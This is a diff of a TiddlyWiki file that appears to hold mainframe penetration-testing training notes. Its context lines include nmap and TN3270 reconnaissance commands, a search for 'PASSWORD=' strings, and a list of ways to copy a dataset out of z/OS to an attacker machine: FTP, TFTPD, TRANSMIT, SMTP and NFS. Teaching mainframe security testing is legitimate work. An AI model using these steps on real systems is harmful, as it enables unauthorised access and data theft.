@@ -8849,7 +8849,7 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181012211519034" modified="20181014064254179" title="$:/DefaultTiddlers">
+<div created="20181012211519034" modified="20181106000914944" title="$:/DefaultTiddlers">
 <pre>Welcome
 History
 [[z/OS Basics]]
@@ -8868,8 +8868,8 @@ Security
 TN3270
 Reconnaissance
 [[Active Recon]]
-Shells
-Enumeration
+[[Getting Shells]]
+[[System Enumeration]]
 Exfiltration
 [[Password Cracking]]
 [[Pass Tickets]]
@@ -9158,7 +9158,7 @@ Exfiltration
 <div created="20181013083805930" modified="20181013083927930" title="$:/state/tab/moresidebar-401116514">
 <pre>$:/core/ui/MoreSideBar/Recent</pre>
 </div>
-<div created="20181012211705603" modified="20181105182947984" title="$:/state/tab/sidebar--1835078512">
+<div created="20181012211705603" modified="20181106000934655" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
 <div list="Welcome History [[z/OS Basics]] [[Jobs and JCL]] [[ISPF Navigation]] CICS Patching [[System Startup]] Storage Security [[Authorized Programs]] [[Beginner JCL]] [[Beginner REXX]] [[Compiling C Programs]] [[High Level Assembly]] TN3270 Reconnaissance [[Active Recon]] [[Getting Shells]] [[System Enumeration]] Exfiltration [[Password Cracking]] [[Pass Tickets]] [[Privilege Escalation]]" title="$:/StoryList">
@@ -9336,7 +9336,7 @@ Exfiltration
 <div created="20181013074947110" modified="20181013082836095" title="$:/view">
 <pre>classic</pre>
 </div>
-<div created="20181013065458362" modified="20181105234434973" tags="" title="Active Recon" type="text/vnd.tiddlywiki">
+<div created="20181013065458362" modified="20181106001226018" tags="" title="Active Recon" type="text/vnd.tiddlywiki">
 <pre>!!''Nmap''
 * All open ports `nmap -n -p- -d -oA ip.date.initial &lt;ip&gt;`
 * Followed by service detection `nmap -sV –p 23,22,21 –vv -d -oA ip.date.service &lt;ip&gt;`
@@ -9355,7 +9355,7 @@ Exfiltration
 ** Record any error messages
 * Try typing `IBMTEST` and see if you get `IBMECHO` reply
 * Use ''Nmap'':
-** `nmap -p 23 -sV –script tn3270-screen --script-args tn3270-screen.commands=“Yes” &lt;ip&gt;`
+** `nmap -p 23 -sV –script tn3270-screen --script-args tn3270-screen.commands=&quot;Yes&quot; &lt;ip&gt;`
 
 !!''Application ID Enumeration''
 * Enumerate CICS Regions, TSO areas, BMC, IMS, Netview, etc
@@ -9567,13 +9567,13 @@ SAY 'The first line is:' var.1
 <div title="cant_insert.png" type="image/png">
 <pre>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</pre>
 </div>
-<div created="20181012224751560" modified="20181105205820848" tags="" title="CICS" type="text/vnd.tiddlywiki">
+<div created="20181012224751560" modified="20181106000538883" tags="" title="CICS" type="text/vnd.tiddlywiki">
 <pre>! ''Customer Information Control System''
 
 !! ''Brief History''
 * Released 1969
 * First revision: Public Utility Customer System
-* Designed to allow ‘interactive’ access to data through terminals
+* Designed to allow interactive access to data through terminals
 * Version 1.2 added web/http support (1997)
 * Now supports JSON, REST, JAVA etc
 * Current version: 5.2
@@ -9613,7 +9613,7 @@ SAY 'The first line is:' var.1
 <div modified="20181015023710641" title="Draft of 'Pass Tickets'">
 <pre></pre>
 </div>
-<div created="20181013075020058" modified="20181105235928302" tags="" title="Exfiltration" type="text/vnd.tiddlywiki">
+<div created="20181013075020058" modified="20181106001013662" tags="" title="Exfiltration" type="text/vnd.tiddlywiki">
 <pre>* Copy files between TSO/OMVS
 **e.g. from TSO `OPUT 'EVIL00.CRITICAL' /tmp/dl`
 ** e.g. from Unix `cp &quot;//'EVIL00.CRITICAL'&quot; /tmp/dl`
@@ -9640,13 +9640,13 @@ QUIT
 * FTP from the mainframe to Linux: `FTP &lt;linux box&gt;`
 * TFTPD server on z/OS: `/usr/sbin/tftpd -p 54321 /cool/folder` 
 ** If you need binary: `/usr/sbin/tftpd -a -p 54321 /cool/folder` 
-* TSO `TRANSMIT` command: `TRANSMIT EVIL.EVIL24 da('EVIL55.PWNED’)` sends ''EVIL55.PWNED'' to ''EVIL24'' on LPAR ''EVIL''
+* TSO `TRANSMIT` command: `TRANSMIT EVIL.EVIL24 da('EVIL55.PWNED')` sends ''EVIL55.PWNED'' to ''EVIL24'' on LPAR ''EVIL''
 * SFTP
 ** Transfers in binary mode by default
 * SCP
 ** ''ONLY TRANSFERS IN ASCII (e.g. will always convert, binary not possible).''
 * Mount NFS Share
-** Use nmap script ‘nfs-showmount’
+** Use nmap script `nfs-showmount`
 ** Mount any folders in Linux
 * SMTP
 ** Make sure your `&lt;dataset&gt;` has an email header then use:
@@ -9782,7 +9782,7 @@ EXITP    LR    1,13            # Move my SA into R1
 
 ,,Copyright EM Training LLC,,</pre>
 </div>
-<div created="20181012211604837" modified="20181105183209540" tags="" title="History" type="text/vnd.tiddlywiki">
+<div created="20181012211604837" modified="20181106000339421" tags="" title="History" type="text/vnd.tiddlywiki">
 <pre>!! ''Why is it called a mainframe?''
 
 * Original mainframes had the &quot;main frame&quot; where all the components lived
@@ -9831,11 +9831,11 @@ EXITP    LR    1,13            # Move my SA into R1
 !! ''Security''
 * ''Resource Access Control Facility (RACF)''
 ** Introduced 1976 after SHARE working group discussions
-** Uses ‘Allow all’ rulesets
+** Uses ''Allow all'' rulesets
 * ''Access Control Facility 2 (ACF2)''
 ** Released 1978
 ** Developed for London Life Insurance in Ontario, Canada
-** Provides ‘Security by Default’
+** Provides ''Security by Default''
 * ''Top Secret''
 ** Released 1979(?)
 ** Similar in aspects to ACF2
@@ -10135,7 +10135,7 @@ SRCHFOR  'PASSWORD='
 <div title="Protected.png" type="image/png">
 <pre>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</pre>
 </div>
-<div created="20181013065131623" modified="20181105234254735" tags="" title="Reconnaissance" type="text/vnd.tiddlywiki">
+<div created="20181013065131623" modified="20181106000805651" tags="" title="Reconnaissance" type="text/vnd.tiddlywiki">
 <pre>!!''Looking for:''
 * LPAR Names/IP Addresses
 * User Name Naming Convention
@@ -10155,7 +10155,7 @@ SRCHFOR  'PASSWORD='
 !!''Other Resources''
 * Confex (SHARE)
 ** Googlefu: site:share.confex.com &quot;company&quot;
-* Sharepoint: LPAR, CICS, IMS, Attachmate, ‘CICS Explorer’, ‘TSO ID’
+* Sharepoint: LPAR, CICS, IMS, Attachmate, 'CICS Explorer', 'TSO ID'
 * Internet mainframes project: https://mainframesproject.tumblr.com
 
 
@@ -10164,7 +10164,7 @@ SRCHFOR  'PASSWORD='
 <div title="reset.png" type="image/png">
